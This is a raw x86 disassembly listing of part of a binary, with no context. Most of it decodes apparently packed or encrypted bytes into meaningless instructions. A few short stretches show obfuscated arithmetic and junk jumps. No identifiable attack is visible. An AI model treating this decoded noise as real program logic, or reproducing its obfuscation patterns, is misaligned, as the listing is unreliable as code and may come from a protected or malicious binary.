  40524b:	out    0xb9,al
  40524d:	inc    edi
  40524e:	cmp    edi,DWORD PTR ss:[eax+0x34]
  405252:	pop    eax
  405253:	sub    al,0xf5
  405255:	mov    ah,0xa0
  405257:	push   0x1f392d4e
  40525c:	mov    ah,0x4d
  40525e:	inc    esp
  40525f:	imul   BYTE PTR [esp+edi*2]
  405262:	add    DWORD PTR [ebx+0x51],eax
  405265:	dec    ebx
  405266:	loope  0x405216
  405268:	ret    
  405269:	jl     0x40523a
  40526b:	cmp    DWORD PTR [esi-0x6d],0xffffffaa
  40526f:	mov    edi,0x29665d52
  405274:	mov    bh,BYTE PTR [edi-0x49]
  405277:	add    al,0xe1
  405279:	xor    eax,DWORD PTR [eax-0x33]
  40527c:	(bad)  
  40527d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40527e:	mov    bl,0x33
  405280:	dec    BYTE PTR [ebx+0x8]
  405283:	xchg   ecx,eax
  405284:	enter  0x885e,0x2f
  405288:	stos   BYTE PTR es:[edi],al
  405289:	fidiv  DWORD PTR [ebx-0x41d9f2e3]
  40528f:	(bad)  
  405290:	ror    BYTE PTR [edx+eiz*2],cl
  405293:	icebp  
  405294:	stc    
  405295:	pop    ds
  405296:	push   ebp
  405297:	mov    al,ah
  405299:	ror    DWORD PTR [edi+0x73],1
  40529c:	sbb    DWORD PTR [ebp+0x68ffc13],ebx
  4052a2:	add    BYTE PTR [bp+si+0x25],bh
  4052a6:	cmp    ebp,DWORD PTR [ecx-0x69e4c59a]
  4052ac:	jmp    0x917d5bcc
  4052b1:	xor    esp,DWORD PTR [edi+0x2f56a6cb]
  4052b7:	fadd   DWORD PTR [ebx]
  4052b9:	(bad)  
  4052ba:	adc    DWORD PTR [esi+0x2a],esp
  4052bd:	fwait
  4052be:	cmp    ebx,DWORD PTR [ebx]
  4052c0:	jns    0x405307
  4052c2:	xor    eax,0x27e22347
  4052c7:	popf   
  4052c8:	inc    esi
  4052c9:	retf   0xfdc3
  4052cc:	xor    BYTE PTR [eax-0x3f],dh
  4052cf:	pop    ds
  4052d0:	ror    al,1
  4052d2:	jecxz  0x405350
  4052d4:	add    DWORD PTR [eax+0x42a1e1e0],edx
  4052da:	pop    edx
  4052db:	dec    ebx
  4052dc:	cdq    
  4052dd:	xchg   ecx,eax
  4052de:	(bad)  
  4052df:	je     0x4052a5
  4052e1:	mov    eax,ds:0x4436f65d
  4052e6:	jl     0x40527a
  4052e8:	outs   dx,DWORD PTR ds:[esi]
  4052e9:	bound  ecx,QWORD PTR [ebp+0x4]
  4052ec:	add    eax,0xcc77773e
  4052f1:	pop    ecx
  4052f2:	mov    fs,WORD PTR ds:0x73dcfd77
  4052f8:	mov    DWORD PTR [ecx+0x74],edx
  4052fb:	(bad)  
  4052fc:	(bad)  
  4052fd:	out    0xfe,eax
  4052ff:	sbb    DWORD PTR [esp+ebp*8+0x75b1122a],ebp
  405306:	add    edx,DWORD PTR [ecx+0x38]
  405309:	mov    edi,0x21a9796e
  40530e:	dec    ecx
  40530f:	push   ss
  405310:	or     bl,ah
  405312:	inc    ebx
  405313:	pusha  
  405314:	shr    bh,1
  405316:	mov    edi,ecx
  405318:	xor    al,0x3e
  40531a:	test   BYTE PTR [ecx-0x7f7f4332],dh
  405320:	inc    edx
  405321:	loop   0x405350
  405323:	(bad)  
  405324:	jns    0x405391
  405326:	imul   di,WORD PTR [ebp+0x5c5b2cda],0x3d
  40532e:	inc    ebx
  40532f:	dec    edi
  405330:	icebp  
  405331:	js     0x405380
  405333:	and    al,0x20
  405335:	sub    bh,al
  405337:	dec    ecx
  405338:	outs   dx,DWORD PTR ds:[esi]
  405339:	cwde   
  40533a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40533b:	out    dx,al
  40533c:	lea    ebp,[ecx-0x578638a3]
  405342:	pop    ds
  405343:	icebp  
  405344:	hlt    
  405345:	cmp    ch,cl
  405347:	jecxz  0x40536e
  405349:	jo     0x405392
  40534b:	int3   
  40534c:	xchg   esp,eax
  40534d:	mov    ch,0x7
  40534f:	lds    esp,FWORD PTR [edx+edx*4-0x6d]
  405353:	test   BYTE PTR [edi-0x3ffbfa1e],dl
  405359:	add    BYTE PTR [esp+edx*4-0x38],dl
  40535d:	adc    ebx,ecx
  40535f:	fcomp  QWORD PTR [edx-0x4e615732]
  405365:	in     eax,0x9b
  405367:	and    al,BYTE PTR [ebx]
  405369:	stos   DWORD PTR es:[edi],eax
  40536a:	pop    esp
  40536b:	retf   
  40536c:	sbb    esp,ebx
  40536e:	fist   WORD PTR [eax+ebx*2]
  405371:	add    ecx,DWORD PTR [ebx-0x14a8760b]
  405377:	retf   
  405378:	fbstp  TBYTE PTR [ecx-0x2b]
  40537b:	cdq    
  40537c:	fwait
  40537d:	add    al,0xc7
  40537f:	lods   al,BYTE PTR ds:[esi]
  405380:	push   ecx
  405381:	ret    0xbd12
  405384:	sbb    BYTE PTR [ecx+0x26],dl
  405387:	push   0xffffffda
  405389:	pop    eax
  40538a:	cmp    BYTE PTR [ebp-0x3f],bl
  40538d:	cli    
  40538e:	(bad)  
  40538f:	fst    QWORD PTR [esi-0x2e44e9d8]
  405396:	repz ds ret 0xed6c
  40539b:	ror    BYTE PTR [edi+0x1680272e],0x3f
  4053a2:	clc    
  4053a3:	inc    ebx
  4053a4:	fisub  WORD PTR [ebx+0x60]
  4053a7:	dec    ebx
  4053a8:	dec    edi
  4053a9:	out    0x7a,al
  4053ab:	outs   dx,DWORD PTR ds:[esi]
  4053ac:	jns    0x4053ed
  4053ae:	iret   
  4053af:	push   es
  4053b0:	xchg   ecx,eax
  4053b1:	jle    0x405385
  4053b3:	mov    ebx,DWORD PTR ds:0xa2cdefab
  4053b9:	mov    edx,0x530c49c9
  4053be:	aam    0x8d
  4053c0:	xor    BYTE PTR [edx+0x26],0x30
  4053c4:	xor    edx,DWORD PTR ds:0xb6cb6f23
  4053ca:	stc    
  4053cb:	mov    es,WORD PTR [bp-0x565d]
  4053d0:	push   ds
  4053d1:	clc    
  4053d2:	scas   al,BYTE PTR es:[edi]
  4053d3:	int    0xca
  4053d5:	mov    ah,0x63
  4053d7:	pop    es
  4053d8:	adc    eax,0x66b1eea1
  4053dd:	push   eax
  4053de:	jl     0x405363
  4053e0:	sub    al,0xe4
  4053e2:	inc    ebx
  4053e3:	popa   
  4053e4:	icebp  
  4053e5:	xchg   esp,eax
  4053e6:	add    BYTE PTR [edx+0x52],dl
  4053e9:	enter  0xb143,0xcb
  4053ed:	das    
  4053ee:	cwde   
  4053ef:	jnp    0x40542c
  4053f1:	iret   
  4053f2:	xor    DWORD PTR [eax],0x7d
  4053f5:	cli    
  4053f6:	mov    ch,0x2b
  4053f8:	sub    eax,esp
  4053fa:	xchg   esp,eax
  4053fb:	cwde   
  4053fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053fd:	xchg   edx,eax
  4053fe:	push   ss
  4053ff:	mov    WORD PTR ds:0x7d49af52,ds
  405405:	xchg   esi,eax
  405406:	movlps QWORD PTR [edx+0x18],xmm0
  40540a:	jg     0x4053d6
  40540c:	clc    
  40540d:	and    dl,BYTE PTR [esi]
  40540f:	lock cwde 
  405411:	test   DWORD PTR [esi-0x2368874a],esp
  405417:	fst    DWORD PTR [edi-0x1c]
  40541a:	stos   DWORD PTR es:[edi],eax
  40541b:	in     al,dx
  40541c:	xchg   esi,eax
  40541d:	(bad)  
  40541e:	xchg   esi,eax
  40541f:	mov    cl,0xd2
  405421:	mov    ds,WORD PTR [eax+0x140a41e7]
  405427:	or     DWORD PTR [edx+0x12],0xcf11d1e3
  40542e:	xchg   esi,eax
  40542f:	push   cs
  405430:	jg     0x4053f8
  405432:	push   esp
  405433:	xchg   edx,esp
  405435:	sub    bl,BYTE PTR [esi]
  405437:	fs cs icebp 
  40543a:	adc    eax,0x8efa6392
  40543f:	xor    eax,0x8a19025d
  405444:	retf   0xe08f
  405447:	shl    BYTE PTR [eax],cl
  405449:	mov    esp,0x566117f5
  40544e:	mov    ebp,DWORD PTR [eax]
  405450:	fstp   TBYTE PTR [edx]
  405452:	add    al,0xcd
  405454:	inc    edx
  405455:	add    DWORD PTR [ecx],esp
  405457:	jge    0x405406
  405459:	aad    0xb6
  40545b:	pop    esi
  40545c:	cs out dx,al
  40545e:	xchg   ecx,eax
  40545f:	mov    BYTE PTR [eax-0x5c40700],bl
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x59e1fbb8]
  405484:	mov    dl,0xb3
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054f5
  40548f:	pop    esp
  405490:	fist   WORD PTR [eax]
  405492:	push   ecx
  405493:	pop    eax
  405494:	push   ecx
  405495:	push   0xffffffca
  405497:	sub    ecx,DWORD PTR [ebp+0x7e]
  40549a:	inc    ebp
  40549b:	fbstp  TBYTE PTR [ebp+0x6e45162d]
  4054a1:	dec    ebx
  4054a2:	(bad)  
  4054a3:	cld    
  4054a4:	add    BYTE PTR ds:0x7bbdb23,dh
  4054aa:	dec    edi
  4054ab:	mov    ebp,0x3de21e6
  4054b0:	cmp    esi,DWORD PTR [edi]
  4054b2:	sbb    esp,DWORD PTR [edi]
  4054b4:	leave  
  4054b5:	scas   al,BYTE PTR es:[edi]
  4054b6:	sbb    ebx,DWORD PTR [ebx+0x3f4eb96a]
  4054bc:	pop    DWORD PTR es:[ebp-0xd]
  4054c0:	or     edi,esp
  4054c2:	fdivr  QWORD PTR [esi+0x3f8b2e2a]
  4054c8:	xor    BYTE PTR [edi+0x12],dh
  4054cb:	mov    bl,BYTE PTR [ebp+0x7e54ee70]
  4054d1:	sub    DWORD PTR [ebp+0x7],edi
  4054d4:	sbb    edi,0x60
  4054d7:	(bad)  
  4054d8:	push   eax
  4054d9:	repz jb 0x40549c
  4054dc:	hlt    
  4054dd:	sahf   
  4054de:	or     BYTE PTR [ebp-0x3015a2eb],dh
  4054e4:	or     eax,0x1e11f572
  4054e9:	cwde   
  4054ea:	pop    es
  4054eb:	mov    ecx,0xc0ce6008
  4054f0:	iret   
  4054f1:	xchg   BYTE PTR [eax-0x35113a86],ah
  4054f7:	cli    
  4054f8:	scas   eax,DWORD PTR es:[edi]
  4054f9:	cmc    
  4054fa:	push   esi
  4054fb:	xchg   ecx,eax
  4054fc:	or     edx,eax
  4054fe:	jmp    0xea02:0x226430f9
  405505:	sub    dh,BYTE PTR [edx-0x10]
  405508:	ror    DWORD PTR [edi-0x4f],1
  40550b:	or     DWORD PTR [ecx+0x47],eax
  40550e:	not    BYTE PTR [edx+0x53]
  405511:	dec    esp
  405512:	lea    ecx,[esi+0x5a]
  405515:	mov    ds:0xfca95537,eax
  40551a:	xchg   esi,eax
  40551b:	nop
  40551c:	(bad)  
  40551d:	icebp  
  40551e:	test   DWORD PTR [ebx],ecx
  405520:	mov    cl,0x12
  405522:	xchg   edi,eax
  405523:	add    al,al
  405525:	mov    DWORD PTR [ebx+0x46],esp
  405528:	in     al,dx
  405529:	les    esi,FWORD PTR gs:[ebp+0x17]
  40552d:	(bad)  
  40552e:	sahf   
  40552f:	arpl   WORD PTR [ebp+ecx*2+0x76f70373],bx
  405536:	and    edx,DWORD PTR [eax]
  405538:	mov    ecx,0xa18ac8ab
  40553d:	inc    ebx
  40553e:	test   DWORD PTR [ecx],0x495e0d5c
  405544:	(bad)  
  405545:	clc    
  405546:	pop    ds
  405547:	ins    BYTE PTR es:[edi],dx
  405548:	call   0x4590:0xd7b4b05b
  40554f:	jbe    0x455161aa
  405555:	xor    ch,dl
  405557:	jecxz  0x4054e3
  405559:	xchg   edx,eax
  40555a:	mov    esp,0x44bd6b39
  40555f:	js     0x4055b7
  405561:	loope  0x40553f
  405563:	dec    eax
  405564:	mov    edi,0x19eb6137
  405569:	cmp    ebx,DWORD PTR [ecx+0x9]
  40556c:	cwde   
  40556d:	add    BYTE PTR [ecx],bl
  40556f:	jmp    0x40551e
  405571:	inc    eax
  405572:	out    dx,al
  405573:	ret    
  405574:	jbe    0x40550e
  405576:	mov    eax,0xc55698a9
  40557b:	push   edx
  40557c:	dec    ecx
  40557d:	dec    eax
  40557e:	and    ch,BYTE PTR [ebp+eiz*8-0x27b2d6e3]
  405585:	loope  0x40558a
  405587:	xchg   edx,eax
  405588:	xchg   edi,eax
  405589:	or     eax,0xccee69b5
  40558e:	mov    BYTE PTR [esi],ch
  405590:	cmp    eax,0xbf9e0a1f
  405595:	sub    al,BYTE PTR [esi]
  405597:	test   eax,0xdc6d66
  40559c:	repnz repnz dec ebx
  40559f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a0:	in     eax,0x92
  4055a2:	or     DWORD PTR [ebx],ebp
  4055a4:	mov    ds:0x1043761e,eax
  4055a9:	fcom   DWORD PTR [esi-0x532130be]
  4055af:	pusha  
  4055b0:	or     DWORD PTR [ebx+0x4c],0x72
  4055b4:	cmp    ebx,DWORD PTR [ecx+0x1b]
  4055b7:	dec    esp
  4055b8:	cmp    cl,dl
  4055ba:	jo     0x405634
  4055bc:	pop    es
  4055bd:	retf   0xa66d
  4055c0:	imul   DWORD PTR [edx]
  4055c2:	inc    esp
  4055c3:	and    DWORD PTR [edx],esp
  4055c5:	test   eax,0xc4ece83c
  4055ca:	jge    0x4055a4
  4055cc:	sub    BYTE PTR [ebp+0x1a6dca33],dh
  4055d2:	inc    edx
  4055d3:	cmovge edi,DWORD PTR [eax+0x3ef1d893]
  4055da:	jl     0x40555c
  4055dc:	das    
  4055dd:	push   edi
  4055de:	xor    ebp,edx
  4055e0:	and    eax,0xa8277361
  4055e5:	and    edx,DWORD PTR [ebx+0xd156b2f]
  4055eb:	cdq    
  4055ec:	loop   0x4055d6
  4055ee:	fstp   QWORD PTR [esi+ebx*2]
  4055f1:	xchg   ecx,eax
  4055f2:	adc    al,0x2a
  4055f4:	nop
  4055f5:	inc    ebp
  4055f6:	push   edx
  4055f7:	jecxz  0x4055ab
  4055f9:	cmp    al,al
  4055fb:	je     0x40561b
  4055fd:	dec    eax
  4055fe:	clc    
  4055ff:	cmp    DWORD PTR [ebp-0x4a],0x31
  405603:	pop    eax
  405604:	xchg   dl,cl
  405606:	xor    bl,BYTE PTR [edi]
  405608:	push   0x65
  40560a:	xor    bh,bl
  40560c:	add    ah,BYTE PTR [ebp-0x1934d592]
  405612:	hlt    
  405613:	cmp    DWORD PTR [eax],0xf232ebab
  405619:	clc    
  40561a:	je     0x405690
  40561c:	ffreep st(1)
  40561e:	jns    0x4055ac
  405620:	pop    ebp
  405621:	xchg   ecx,eax
  405622:	sahf   
  405623:	aam    0xef
  405625:	addr16 jbe 0x405634
  405628:	fidiv  WORD PTR [esi]
  40562a:	loope  0x40566f
  40562c:	jmp    0x4055f5
  40562e:	out    dx,eax
  40562f:	sbb    ch,BYTE PTR [edi+eax*2-0x24]
  405633:	ins    DWORD PTR es:[edi],dx
  405634:	cli    
  405635:	retf   0x4816
  405638:	adc    al,0xd
  40563a:	or     ah,BYTE PTR [edi]
  40563c:	inc    esi
  40563d:	xor    bh,ch
  40563f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405640:	test   BYTE PTR [ecx+0x6a],bl
  405643:	adc    DWORD PTR [eax+0x55],esi
  405646:	adc    eax,DWORD PTR [edx-0x5ad0a5b8]
  40564c:	add    ebx,ebx
  40564e:	dec    ecx
  40564f:	pushf  
  405650:	mov    cs,WORD PTR [esi]
  405652:	jo     0x4055e9
  405654:	mov    al,0x2c
  405656:	das    
  405657:	xchg   esp,eax
  405658:	int3   
  405659:	xchg   esi,eax
  40565a:	jmp    0x109a:0xe694e2c
  405661:	jmp    0x3d40b05c
  405666:	out    dx,eax
  405667:	push   esi
  405668:	push   eax
  405669:	xchg   ecx,eax
  40566a:	jae    0x40560e
  40566c:	and    eax,DWORD PTR [esi]
  40566e:	sub    eax,esp
  405670:	pop    esp
  405671:	int3   
  405672:	stc    
  405673:	not    DWORD PTR [edx]
  405675:	clc    
  405676:	xor    ecx,eax
  405678:	add    al,0x7f
  40567b:	cmp    BYTE PTR ds:0x451727f5,0x2e
  405682:	(bad)  
  405684:	pop    ebp
  405685:	stos   DWORD PTR es:[edi],eax
  405686:	dec    ebp
  405687:	mov    ebp,0x3cb44cd5
  40568c:	or     DWORD PTR [ebx+0x1e0a02b3],esp
  405692:	mov    ecx,0xc05f709f
  405697:	inc    esi
  405698:	scas   eax,DWORD PTR es:[edi]
  405699:	stos   BYTE PTR es:[edi],al
  40569a:	adc    esp,DWORD PTR [ebp+0x6080db60]
  4056a0:	repnz mov eax,0x6bb20215
  4056a6:	(bad)
  4056a9:	jle    0x40571e
  4056ab:	mov    ebp,0x62ce4b3a
  4056b0:	xchg   ebp,eax
  4056b1:	shr    DWORD PTR [esi+0x249effba],cl
  4056b7:	test   ch,cl
  4056b9:	push   cs
  4056ba:	imul   eax,DWORD PTR [edx+0x4e],0xffffffa8
  4056be:	dec    esp
  4056bf:	fcmovne st,st(7)
  4056c1:	data16 (bad) 
  4056c3:	ss push esi
  4056c5:	test   BYTE PTR [esi-0x1036e814],0xdc
  4056cc:	sub    al,0x99
  4056ce:	add    DWORD PTR [ebx-0x21],edi
  4056d1:	je     0x40567e
  4056d3:	add    BYTE PTR [eax-0xe5a2267],0x21
  4056da:	mov    dh,0xb1
  4056dc:	push   ebx
  4056dd:	or     esp,eax
  4056df:	aas    
  4056e0:	in     eax,0x72
  4056e2:	cld    
  4056e3:	or     al,al
  4056e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e6:	repnz in al,0xa7
  4056e9:	mov    cs,WORD PTR [esi-0x48caaf04]
  4056ef:	cmp    al,0xf5
  4056f1:	fs pop ss
  4056f3:	mov    edi,0x195bda2a
  4056f8:	js     0x405718
  4056fa:	addr16 xchg edx,eax
  4056fc:	or     al,0xf7
  4056fe:	clc    
  4056ff:	ja     0x40570e
  405701:	mov    bl,0xf5
  405703:	jo     0x405709
  405705:	fwait
  405706:	sbb    edx,DWORD PTR [esi]
  405708:	out    dx,al
  405709:	es loopne 0x4056a8
  40570c:	mov    edi,0x289d9761
  405711:	mov    ebp,0xe6c93938
  405716:	lock (bad) 
  405718:	push   eax
  405719:	sub    eax,0xdec2764e
  40571e:	adc    eax,0xf5351129
  405723:	mov    dh,0x75
  405725:	push   edi
  405726:	shr    ecx,cl
  405728:	jo     0x40571b
  40572a:	dec    esi
  40572b:	stos   DWORD PTR es:[edi],eax
  40572c:	jmp    0xed6e7ed
  405731:	pop    edx
  405732:	fisttp WORD PTR [edi+0x23]
  405735:	mov    ds:0x228a772d,al
  40573a:	ins    BYTE PTR es:[edi],dx
  40573b:	inc    esp
  40573c:	mov    ds:0x34acf42b,eax
  405741:	and    al,0xca
  405743:	fsub   st,st(6)
  405745:	rol    DWORD PTR [edi],cl
  405747:	lods   al,BYTE PTR ds:[esi]
  405748:	rcl    BYTE PTR [ecx-0x76800d2a],1
  40574e:	fidiv  WORD PTR [ebx]
  405750:	sub    esp,edi
  405752:	loope  0x405782
  405754:	sbb    esi,edx
  405756:	or     DWORD PTR [edi+eax*1-0x4fc03026],0x2ce753ee
  405761:	mov    al,BYTE PTR [esi]
  405763:	cwde   
  405764:	or     ecx,DWORD PTR [ecx]
  405766:	lock fst DWORD PTR [ebx+0x69]
  40576a:	xor    al,0x74
  40576c:	dec    ebp
  40576d:	sub    BYTE PTR [eax-0x502c946d],cl
  405773:	add    esi,DWORD PTR [ebx]
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xec
  4057f5:	add    eax,0x363a8100
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	je     0x405835
  405802:	sahf   
  405803:	jno    0x405847
  405805:	lahf   
  405806:	jge    0x4057d0
  405808:	ror    BYTE PTR [esi+eiz*4-0x77],0x47
  40580d:	scas   al,BYTE PTR es:[edi]
  40580e:	out    dx,eax
  40580f:	jno    0x405815
  405811:	or     ecx,DWORD PTR [edx]
  405813:	js     0x4057e4
  405815:	mov    edx,0xd26c4385
  40581a:	push   ecx
  40581b:	cdq    
  40581c:	mov    bh,0xfb
  40581e:	ficomp DWORD PTR [ebx-0x28]
  405821:	mov    cl,0xf6
  405823:	popa   
  405824:	and    esp,DWORD PTR [edx]
  405826:	ret    
  405827:	ja     0x405860
  405829:	push   ss
  40582a:	mov    ds,WORD PTR cs:[ebp-0x67b349ff]
  405831:	int3   
  405832:	fld    DWORD PTR [ecx+0x5]
  405835:	mov    bh,0x87
  405837:	fild   QWORD PTR [ecx-0x458632e1]
  40583d:	pop    es
  40583e:	sbb    al,0x60
  405840:	or     eax,0x28146f21
  405845:	dec    ebp
  405846:	aad    0x51
  405848:	scas   al,BYTE PTR es:[edi]
  405849:	mov    dl,0xa3
  40584b:	xchg   BYTE PTR [ecx+0x56],ch
  40584e:	ret    
  40584f:	push   ax
  405851:	mov    edx,0xb035277
  405856:	test   al,0x0
  405858:	adc    DWORD PTR [edx+0x40],esi
  40585b:	fisttp WORD PTR [ebx-0x69]
  40585e:	jno    0x405875
  405860:	(bad)  
  405861:	pop    eax
  405862:	inc    esp
  405863:	adc    ecx,DWORD PTR [eax-0x7fa7b3fc]
  405869:	pop    eax
  40586a:	inc    eax
  40586b:	shl    BYTE PTR [ebp-0x3b3e9cb3],cl
  405871:	dec    eax
  405872:	and    BYTE PTR [ebp+0x1e9a0511],dh
  405878:	lock sub ah,BYTE PTR [ecx]
  40587b:	mov    ebp,0x7b8a64a8
  405880:	jae    0x4058e9
  405882:	repz jecxz 0x40582c
  405885:	clc    
  405886:	mov    esp,0x85405ee0
  40588b:	mov    cl,ah
  40588d:	popf   
  40588e:	mov    eax,ds:0x927bfe90
  405893:	aam    0x88
  405895:	lds    ebp,FWORD PTR [ebx+0x3893544d]
  40589b:	mov    ah,0xc2
  40589d:	push   edx
  40589e:	call   0x438bf9b8
  4058a3:	imul   ebx,DWORD PTR [edi-0x3d],0xaed8bebb
  4058aa:	lea    ecx,[esi-0x257a0516]
  4058b0:	pushf  
  4058b1:	mov    DWORD PTR [ecx+0x1c],esi
  4058b4:	dec    esi
  4058b5:	and    al,dh
  4058b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b8:	mov    ch,0xdf
  4058ba:	push   esi
  4058bb:	shr    DWORD PTR [edi-0x5],cl
  4058be:	aam    0xde
  4058c0:	stc    
  4058c1:	cmp    BYTE PTR [ecx],bh
  4058c3:	xchg   ecx,eax
  4058c4:	out    0xc7,eax
  4058c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058c7:	or     BYTE PTR [edi+eiz*8],ch
  4058ca:	mov    dl,0x33
  4058cc:	sub    bl,BYTE PTR [ebp+0x4f]
  4058cf:	out    dx,al
  4058d0:	push   esp
  4058d1:	pop    ecx
  4058d2:	lea    ebp,[ebp+eax*4+0x6b]
  4058d6:	sub    DWORD PTR [ebx+0x3f86a494],eax
  4058dc:	in     eax,0x6f
  4058de:	jg     0x40595b
  4058e0:	call   0x4a9:0x628f4423
  4058e7:	out    0xa4,ax
  4058ea:	int    0xc5
  4058ec:	test   BYTE PTR [ebp-0x2f541ca1],dh
  4058f2:	push   DWORD PTR [eax]
  4058f4:	xchg   edx,eax
  4058f5:	das    
  4058f6:	or     eax,DWORD PTR [esp+ecx*1]
  4058f9:	js     0x4058e2
  4058fb:	pushf  
  4058fc:	rol    BYTE PTR [ebx],0x13
  4058ff:	lahf   
  405900:	inc    esi
  405901:	scas   al,BYTE PTR es:[edi]
  405902:	fst    QWORD PTR [ecx]
  405904:	in     eax,dx
  405905:	fimul  DWORD PTR [ecx+0x56686943]
  40590b:	in     eax,0x6a
  40590d:	lods   al,BYTE PTR ds:[esi]
  40590e:	jns    0x405893
  405910:	dec    edx
  405911:	rcl    DWORD PTR [edx],cl
  405913:	sub    eax,0x9cae08f2
  405918:	push   ebx
  405919:	mov    DWORD PTR [esi],edi
  40591b:	in     al,dx
  40591c:	addr16 sbb ebp,esp
  40591f:	scas   eax,DWORD PTR es:[edi]
  405920:	cld    
  405921:	fild   QWORD PTR [eax]
  405923:	push   ss
  405924:	int3   
  405925:	pop    eax
  405926:	sbb    DWORD PTR [ebx+0x5d84bbf1],ebp
  40592c:	sar    DWORD PTR [ecx-0x74],0x33
  405930:	cmp    esp,0x29
  405933:	hlt    
  405934:	mov    BYTE PTR [eax+0x4bfa949e],bl
  40593a:	inc    edi
  40593b:	iret   
  40593c:	pop    eax
  40593d:	hlt    
  40593e:	fadd   QWORD PTR [ebp+0x2c248e8e]
  405944:	sahf   
  405945:	sbb    BYTE PTR [ebx+0x6c],dh
  405948:	(bad)  
  405949:	out    dx,eax
  40594a:	push   cs
  40594b:	cmp    DWORD PTR [esi],ebx
  40594d:	or     ecx,ebp
  40594f:	inc    edi
  405950:	loop   0x40593d
  405952:	fisttp DWORD PTR [edx]
  405954:	xchg   edi,eax
  405955:	sbb    DWORD PTR [ebx+esi*4-0x23dbe3e8],0xfd13e042
  405960:	je     0x40597a
  405962:	pop    esi
  405963:	add    bh,dl
  405965:	sar    bh,1
  405967:	cmp    DWORD PTR [eax],eax
  405969:	imul   esi,DWORD PTR [eax+0x44],0xfffffff4
  40596d:	inc    ebx
  40596e:	(bad)  
  40596f:	mov    dh,0xc8
  405972:	inc    ebp
  405973:	xchg   edi,eax
  405974:	and    BYTE PTR [esi+esi*8-0x72],0xa
  405979:	add    BYTE PTR [esi],0x29
  40597c:	push   es
  40597d:	inc    ecx
  40597e:	jmp    0x3f21:0x9596f3d5
  405985:	and    bh,ch
  405987:	add    DWORD PTR [ebx-0x26b6ef3],edi
  40598d:	adc    al,0x49
  40598f:	popa   
  405990:	(bad)  
  405992:	jl     0x4059a0
  405994:	mov    dh,0xc0
  405996:	mov    DWORD PTR [edi-0x72],edi
  405999:	add    DWORD PTR [esi+0x4e],0x4fbead31
  4059a0:	dec    eax
  4059a1:	cmp    ecx,DWORD PTR [ebp-0x3d]
  4059a4:	les    esi,FWORD PTR [ebp-0x40]
  4059a7:	adc    BYTE PTR [ebx],cl
  4059a9:	cld    
  4059aa:	ror    eax,1
  4059ac:	idiv   ah
  4059ae:	(bad)  
  4059af:	cmp    DWORD PTR [edi],esp
  4059b1:	cmp    al,0x18
  4059b3:	adc    al,ah
  4059b5:	btc    DWORD PTR [ebx-0x55],ecx
  4059b9:	sub    eax,0x65449e63
  4059be:	ds cli 
  4059c0:	add    esi,DWORD PTR [edx+ebp*1-0x374e9cc0]
  4059c7:	js     0x40599e
  4059c9:	retf   0x26ed
  4059cc:	div    BYTE PTR [ebx]
  4059ce:	in     eax,dx
  4059cf:	add    edi,DWORD PTR [ebp+0x72a53776]
  4059d5:	mov    esp,0x3466dea1
  4059da:	pop    DWORD PTR [edi+0x3c61a9c0]
  4059e0:	leave  
  4059e1:	pop    esi
  4059e2:	xchg   esi,eax
  4059e3:	dec    edi
  4059e4:	cmp    bl,BYTE PTR [edi-0x4d534275]
  4059ea:	xchg   DWORD PTR [ebx-0xb6521fd],ecx
  4059f0:	adc    esp,DWORD PTR [ebp-0x6644cdc2]
  4059f6:	loopne 0x4059ac
  4059f8:	adc    eax,0xdec558a2
  4059fd:	cmp    al,0x71
  4059ff:	aad    0xa4
  405a01:	push   esp
  405a02:	jle    0x405a46
  405a04:	in     al,dx
  405a05:	imul   DWORD PTR ds:0x9a466b29
  405a0b:	sbb    eax,0xef1c8aa0
  405a10:	sbb    DWORD PTR [ecx-0x20],ebp
  405a13:	(bad)  
  405a15:	mov    ecx,0xf278b54f
  405a1a:	push   cs
